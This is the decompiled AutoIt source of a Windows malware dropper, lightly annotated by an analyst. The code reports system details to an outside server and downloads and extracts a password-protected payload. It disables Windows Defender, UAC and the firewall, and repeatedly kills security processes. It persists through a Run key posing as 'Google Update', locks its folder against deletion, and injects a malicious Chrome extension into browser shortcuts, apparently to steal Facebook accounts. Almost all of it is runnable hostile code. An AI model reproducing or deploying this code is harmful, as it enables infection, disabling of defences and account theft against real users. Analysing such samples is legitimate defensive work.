; The decoded file, with some modifications
Global $virusdir = @AppDataDir & "\" & @UserName
$lsrlgh = StringSplit("Start|cmd.exe|Program Manager", "|")
$loptakx = StringSplit("updater|video|play|visitor|app", "|")
$vzmpkv = "No"
$itbnnhl = "No"
main() ; This is the main function!

Func main() ; Main!!!!! - Check if vaild name
	$flag = False
	; This probably check if the name of the exe file is vaild, then decide to run
	For $i = 1 To $loptakx[0]
		$result = StringInStr(StringLower(@ScriptName), $loptakx[$i])
		If $result <> 0 Then
			$flag = True
			ExitLoop
		EndIf
	Next
	If $flag = False Then
		ConsoleWrite("ExitControlExeName") ; Wow, if the exe name is not vaild, then quit the program :)
										   ; I didn't know why the author do this? Maybe for checking
										   ; if the program is decompiled and then recompiled?
		Exit
	Else
		Global $wintitle = WinGetTitle("[ACTIVE]") ; Get current active windows / current focused windows
		If $wintitle = "" Then
			$wintitle = "Empty" ; Why set the windows title to empty??????
		EndIf
		main2() ; Yeah, the current function is really a main function, after first check it call the real thing :)
	EndIf
EndFunc

Func main2() ; Run only one instance
	$processpointer = ProcessList(@ScriptName) ; Get the current program process
	For $counter = 1 To $processpointer[0][0] ; Get number of instances of this process
		If $processpointer[$counter][1] <> @AutoItPid Then ; Get pid of processes and compare
			ConsoleWrite("ExitAlreadyRunning") ; Run the virus once
			Exit
		EndIf
	Next
	main3() ; Continue
EndFunc

Func main3() ; Ping server
	$counter = 0
	While $counter = 0
		$counter = Ping("google.com") ; They ping google to check if network available :) - the old trick!
		Sleep(500)
	WEnd
	main4() ; Next!
EndFunc

Func main4() ; Search for Windows Defender
	Global $cghylztxnjb = ProcessExists("MsMpEng.exe") ; Searching for Windows Defender, and report to the server. See below
	main5()
EndFunc

Func main5()
	$vzmpkv = RegRead("HKCU\Software\Unzip", "Installed") ; Open registry key "HKCU\Software\Unzip" and read the value "Installed"
	Global $itbnnhl = RegRead("HKCU\Software\Unzip", "Trust")
	If $vzmpkv = "Yes" Then ; Check if Unzip program (I haven't seen any program named unzip, maybe 7-zip?)
		found_unzip() ; Found Unzip
	Else
		$vzmpkv = "No" ; Decoded as 'No'
		notfound_unzip() ; Not found
	EndIf
EndFunc

Func notfound_unzip()
	For $i = 1 To $lsrlgh[0] ; StringSplit("Start|cmd.exe|ProgramManager", "|")
		If StringInStr($wintitle, $lsrlgh[$i]) <> 0 Then
			ConsoleWrite("Exit:IsBannedWindow")
			Exit
		EndIf
	Next
	found_unzip() ; Why jump?
EndFunc

Func found_unzip() ; Submit system information to server and get malaware from it!
	; Finally, http request!
	; Actually this function is from win32api
	; False means only one request, not multiple connections.
	
	; From what I saw here, they send some information of the system to the server.
	Global $httprequest = ObjCreate("winhttp.winhttprequest.5.1")
	$httprequest.Open("HEAD", "http://pube.me/app/login.php", False)
	$httprequest.setRequestHeader("User-Agent", "Unzip")
	$httprequest.setRequestHeader("Windows", "[ACTIVE]")
	$httprequest.setRequestHeader("ScriptName", @ScriptName)
	$httprequest.setRequestHeader("OS", @OSVersion)
	$httprequest.setRequestHeader("DefenderActive", ProcessExists("MsMpEng.exe"))
	$httprequest.setRequestHeader("CPU", "X64") ; I don't know why undefined. so default "X86". Originally @CPUArch
	$httprequest.setRequestHeader("Installed", $vzmpkv) ; Installed unzip or not?
	$httprequest.setRequestHeader("Version", 1) ; Don't know why it always be 1
	If RegRead("HKCU\Software\Unzip", "Trust") <> "No" Then ; Remember $itbnnhl = RegRead("HKCU\Software\Unzip", "Trust")
		; If that program installed
		$httprequest.setRequestHeader("Trust", "No")
	EndIf
	$httprequest.Send() ; Send the request to server
	$requeststatus = $httprequest.Status ; Get request submit status
	If $requeststatus <> 200 Then ; Check if request sent or not, Http 200 code means succeeded
		ConsoleWrite("http://pube.me/app/login.php")
		ConsoleWrite("Response" & $requeststatus) ; Write the response code
		ConsoleWrite("Exit:GetConfig")
		Exit
	EndIf
	Global $sevenzipurl = $httprequest.GetResponseHeader("unzip")
	Global $virusurl = $httprequest.GetResponseHeader("zip") ; Get the file url to download
	main6($sevenzipurl, $virusurl)
EndFunc

Func main6($sevenzipurl, $virusurl) ; Write Installed key
	; Alright, the virus write to the key unzip to check if it has already installed or not
	;RegWrite("HKCU\Software\Unzip", "Installed", "REG_SX[}q/q:OO=ZLb5o4g}m:Yes")
	main7($sevenzipurl, $virusurl)
EndFunc

Func main7($sevenzipurl, $virusurl) ; Create directory in appdata
	DirCreate($virusdir) ; Create the directory in AppData
	main8($sevenzipurl, $virusurl)
EndFunc

Func main8($sevenzipurl, $virusurl) ; Download 7-zip and virus
	If NOT FileExists($virusdir & "\7za.exe") Then ; Check if 7-zip available in that directory - to extract the virus
		InetGet($sevenzipurl, $virusdir & "\7za.exe", 1, 0) ; Download 7-zip, force reload mode (force redownload even if exist), download then continue (running in foreground)
	EndIf
	InetGet($virusurl, $virusdir & "\files.7z", 1,0) ; Download virus in the form of 7z archive and set a password so antiviruses cannot detect
	main9()
EndFunc

Func main9() ; Extract the virus
	RunWait($virusdir & "\" & "7za.exe e files.7z -aoa -pKEQZmgbrmDnTpa2b4DHVMX", $virusdir, @SW_HIDE) ; Extract the virus, the protected password is KEQZmgbrmDnTpa2b4DHVMX
	main10() ; This is when the malaware get executed, so if you want to fetch the file only, please comment this line!!!
EndFunc

Func main10() ; Kill Windows Defender
	If @OSVersion = "WIN_10" Then ; Check if the windows version is Windows 10 - maybe to find Windows Defender?
		Run($virusdir & "\" & "defender.exe /D", $virusdir, @SW_HIDE) ; Windows Defender disabler
		ProcessClose("SecurityHealthHost.exe") ; Kill it! Easy like that?
	EndIf
	main11()
EndFunc

Func main11() ; Copy itself to virus directory
	FileCopy(@ScriptFullPath, $virusdir & "\app.exe", 1) ; Copy the current virus itself to the virus directory it created
	main12()
EndFunc

Func main12() ; Kill Chrome
	While WinGetHandle(REGEXPTITLE:(?i)(.*Chrome.*)) ; Close chrome? Why?
		WinClose([REGEXPTITLE:(?i)(.*Chrome.*)])
	WEnd
	ProcessClose("chrome.exe")
	ProcessWaitClose("chrome.exe") ; Why kill chrome?
	main13()
EndFunc

Func main13() ; Protect itself from being killed or deleted
	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn setprot -op dacl:p_nc", $virusdir, @SW_HIDE)
	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:SYSTEM;p:del_child;m:deny -ace n:SYSTEM;p:delete;m:deny", $virusdir, @SW_HIDE)
	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:Administrators;p:del_child;m:deny -ace n:Administrators;p:delete;m:deny", $virusdir, @SW_HIDE)
	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:Users;p:del_child;m:deny -ace n:Users;p:delete;m:deny", $virusdir, @SW_HIDE)
	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:Everyone;p:del_child;m:deny -ace n:Everyone;p:delete;m:deny", $virusdir, @SW_HIDE)
	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn setowner -ownr n:SYSTEM", $virusdir, @SW_HIDE)
	main14()
EndFunc

Func main14() ; Write registry to disable antiviruses and Chrome
	;RegWrite("REG_DWORD", "LowRiskFileTypes", "REG_S", ".exe")
	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations", "LowRiskFileTypes", "REG_SZ", ".exe")
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "Google Update", "REG_SZ", $virusdir & "\app.exe")
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", 0)
	RegWrite("HKLM\Software\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "REG_DWORD", 1)
	RegWrite("HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "EnableFirewall", "REG_DWORD", 0)
	RegWrite("HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "DisableNotifications", "REG_DWORD", 1)
	RegWrite("HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService", "Start", "REG_DWORD", 200)
	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "SecurityHealth")
	main15()
EndFunc

Func main15() ; Insert malaware extension to Chrome (to steal Facebook!)
	ShellExecute("chrome.exe", "--enable-automation --restore-last-session --disable-blink-features=AutomationControlled --load-extension=" & $virusdir, "", "", @SW_MAXIMIZE)
	main16()
	zlmsyuslmwzh()
EndFunc

Func main16() ; Replace Chrome shortcut with malaware extension
	Local $array2d[5][2] ; Setup an 2D array
	$array2d[0][0] = @AppDataDir & "\Microsoft\Internet Explorer\Quick Launch"
	$array2d[1][0] = @AppDataCommonDir & "\Microsoft\Internet Explorer\Quick Launch"
	$array2d[2][0] = @DesktopDir
	$array2d[3][0] = @ProgramsCommonDir
	$array2d[4][0] = @DesktopCommonDir
	$array2d[0][1] = 1
	$array2d[1][1] = 1
	$array2d[2][1] = 0
	$array2d[3][1] = 0
	$array2d[4][1] = 0
	For $counter = 0 To 4
		If $array2d[$counter][1] = 1 Then
			ezmdwuawsws($array2d[$counter][0])
		EndIf
		sesrarlhuog($array2d[$counter][0])
	Next
EndFunc

Func ezmdwuawsws($p)
	Local $returnvalue = xpwtesac($p, "*", 2)
	If @error = 0 Then
		For $counter = 1 To $returnvalue[0]
			sesrarlhuog($p & "\" & $returnvalue[$counter])
			ezmdwuawsws($p & "\" & $returnvalue[$counter])
		Next
	EndIf
EndFunc

Func sesrarlhuog($dgtnmsyt)
	Local $qfmiznc = xpwtesac($dgtnmsyt, "*.lnk")
	If @error = 0 Then
		$hajaxgrbel = $qfmiznc[0]
		For $counter = 1 To $hajaxgrbel
			ajaqfqn($dgtnmsyt & '\' & $qfmiznc[$counter])
		Next
	EndIf
EndFunc

Func ajaqfqn($kxpdbrfgb)
	$gfwbjvvluo = FileGetShortcut($kxpdbrfgb)
	If NOT @error Then
		$agbhl = vpmfq($gfwbjvvluo[0], "", "", "", "")
		If $agbhl[3] = "chrome" Then
			fuaxi($gfwbjvvluo, $kxpdbrfgb)
		EndIf
	EndIf
EndFunc

Func fuaxi($gfwbjvvluo, $kxpdbrfgb) ; Chrome shortcut with malaware extension
	FileCreateShortcut($gfwbjvvluo[0], $kxpdbrfgb, $gfwbjvvluo[1], "--enable-automation --disable-blink-features=AutomationControlled --load-extension=" & $virusdir)
EndFunc

Func zlmsyuslmwzh() ; Inject fake update service to Chrome and kill Windows Defender
	If "X86" = "X64" Then ; Originally @CPUArch
		$toujmktea = "update-x64.exe"
	Else
		$toujmktea = "update-x86.exe"
	EndIf
	While 1
		If FileExists($virusdir & "\" & $toujmktea) Then
			If NOT ProcessExists($toujmktea) Then
				Run($virusdir & "\" & $toujmktea, $virusdir, @SW_HIDE)
			EndIf
		EndIf
		ProcessClose("software_reporter_tool.exe")
		ProcessClose("MsMpEng.exe")
		ProcessClose("SecurityHealthHost.exe")
		ProcessClose("SecurityHealthService.exe")
		Sleep(3000)
	WEnd
EndFunc

Func xpwtesac($p1, $p2 = "*", $p3 = 0, $p4 = False)
	Local $var1 = "", $var2 = "", $var3 = ""
	$p1 = StringRegExpReplace($p1, "[\\/]+$", "") & "\"
	If $p3 = Default Then $p3 = 0
	If $p4 Then $var3 = $p1
	If $p2 = Default Then $p2 = "*"
	If NOT FileExists($p1) Then Return SetError(1, 0, 0)
	If StringRegExp($p2, "[\\/:><\|]|(?s)^\s*$") Then Return SetError(2, 0, 0)
	If NOT ($p3 = 0 OR $p3 = 1 OR $p3 = 2) Then Return SetError(3, 0, 0)
	Local $filepointer = FileFindFirstFile($p1 & $p2)
	If @error Then Return SetError(4, 0, 0)
	While 1
		$var2 = FileFindNextFile($filepointer)
		If @error Then ExitLoop
		If ($p3 + @extended = 2) Then ContinueLoop
		$var1 &= "|" & $var3 & $var2
	WEnd
	FileClose($filepointer)
	If $var1 = "" Then Return SetError(4, 0, 0)
	Return StringSplit(StringTrimLeft($var1, 1), "|")
EndFunc

Func vpmfq($p1, $mnjxaygqfkun, $ekbgffqnc, $var2, $rkeywqqfeyg)
	Local $nhpcr = StringRegExp($p1, "^\h*((?:\\\\\?\\)*(\\\\[^\?\/\\]+|[A-Za-z]:)?(.*[\/\\]\h*)?((?:[^\.\/\\]|(?(?=\.[^\/\\]*\.)\.))*)?([^\/\\]*))$", 1)
	If @error Then
		ReDim $nhpcr[5]
		$nhpcr[0] = $p1
	EndIf
	$mnjxaygqfkun = $nhpcr[1]
	If StringLeft($nhpcr[2], 1) == "/" Then
		$ekbgffqnc = StringRegExpReplace($nhpcr[2], "\h*[\/\\]+\h*", "\/")
	Else
		$ekbgffqnc = StringRegExpReplace($nhpcr[2], "\h*[\/\\]+\h*", "\\")
	EndIf
	$nhpcr[2] = $ekbgffqnc
	$var2 = $nhpcr[3]
	$rkeywqqfeyg = $nhpcr[4]
	Return $nhpcr
EndFunc
